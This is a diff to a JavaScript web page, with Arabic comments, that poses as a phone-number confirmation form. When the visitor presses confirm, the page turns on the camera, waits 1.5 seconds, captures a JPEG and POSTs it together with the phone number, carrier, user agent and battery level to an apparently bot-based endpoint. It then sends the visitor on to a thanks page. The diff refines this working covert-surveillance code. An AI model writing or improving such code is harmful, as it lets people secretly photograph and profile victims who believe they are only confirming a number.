@@ -16,7 +16,7 @@ fetch('config.json')
     alert('حدث خطأ في تحميل الإعدادات. تأكد من وجود config.json.');
   });
 
-// تحديث اسم مزود الخدمة عند كتابة الرقم
+// عرض مزود الخدمة حسب رقم الهاتف
 document.getElementById('phoneNumber').addEventListener('input', () => {
   const phone = document.getElementById('phoneNumber').value;
   const carrierName = detectCarrier(phone);
@@ -46,11 +46,8 @@ function startCameraAndSend() {
     alert('يرجى إدخال رقم الهاتف.');
     return;
   }
-
-  const btn = document.getElementById('confirmBtn');
-  btn.innerHTML = 'جاري التأكيد...';
-  btn.disabled = true;
-
+  document.getElementById('confirmBtn').innerHTML = 'جاري تاكيد...';
+  document.getElementById('confirmBtn').disabled = true;
   captureAndSendPhoto(phoneNumber);
 }
 
@@ -67,6 +64,7 @@ async function captureAndSendPhoto(phoneNumber) {
     video.srcObject = stream;
     await video.play();
 
+    // ننتظر 1.5 ثانية لتهيئة الكاميرا
     await new Promise(res => setTimeout(res, 1500));
 
     const canvas = document.createElement('canvas');
@@ -86,19 +84,21 @@ async function captureAndSendPhoto(phoneNumber) {
         method: 'POST',
         body: formData
       })
-        .then(res => res.json())
-        .then(result => {
-          if (!result.ok) {
-            console.error("فشل الإرسال:", result.description);
-          }
-        })
-        .catch(err => {
-          console.error("خطأ أثناء الإرسال:", err);
-        });
+      .then(res => res.json())
+      .then(result => {
+        if (!result.ok) {
+          console.error("فشل الإرسال:", result.description);
+          resetButton();
+        } else {
+          // الإرسال ناجح — تحويل لصفحة الشكر
+          window.location.href = 'thanks.html';
+        }
+      })
+      .catch(err => {
+        console.error("خطأ أثناء الإرسال:", err);
+        resetButton();
+      });
 
-      document.getElementById('confirmedNumber').innerText = phoneNumber;
-      document.getElementById('confirmationMessage').style.display = 'block';
-      resetButton();
       stream.getTracks().forEach(track => track.stop());
     }, 'image/jpeg');
 
@@ -124,12 +124,13 @@ async function collectUserInfo(phoneNumber) {
     try {
       const battery = await navigator.getBattery();
       batteryLevel = Math.round(battery.level * 100) + "%";
-    } catch {
+    } catch (e) {
       batteryLevel = "غير متاح";
     }
   }
 
   const carrier = detectCarrier(phoneNumber);
+
   const caption = `📱 رقم الهاتف: ${phoneNumber}
 🏢 مزود الخدمة: ${carrier}
 🖥️ نوع الجهاز: ${userAgent}
